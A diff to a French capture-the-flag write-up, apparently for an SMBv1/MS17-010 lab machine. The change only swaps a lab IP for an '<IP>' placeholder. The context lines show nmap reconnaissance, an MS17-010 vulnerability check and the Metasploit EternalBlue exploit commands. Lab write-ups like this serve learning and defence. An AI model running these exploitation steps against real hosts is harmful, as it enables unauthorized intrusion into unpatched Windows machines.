@@ -22,7 +22,7 @@ La cible expose **SMBv1** sur un **Windows 7 SP1** non corrigé, vulnérable à 
 ### Scan nmap de référence
 
 ```bash
-nmap -sC -sV -p- -oA nmap/blue 10.129.108.123
+nmap -sC -sV -p- -oA nmap/blue <IP>
 ```
 
 Ports notables :
@@ -51,7 +51,7 @@ smb-security-mode : message_signing: disabled (dangerous, but default)
 Détection non intrusive via le script NSE dédié :
 
 ```bash
-nmap --script smb-vuln-ms17-010 -p445 10.129.108.123
+nmap --script smb-vuln-ms17-010 -p445 <IP>
 ```
 
 Résultat :
@@ -77,7 +77,7 @@ smb-vuln-ms17-010:
 ```
 msfconsole -q
 use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 10.129.108.123
+set RHOSTS <IP>
 set LHOST tun0
 check
 run
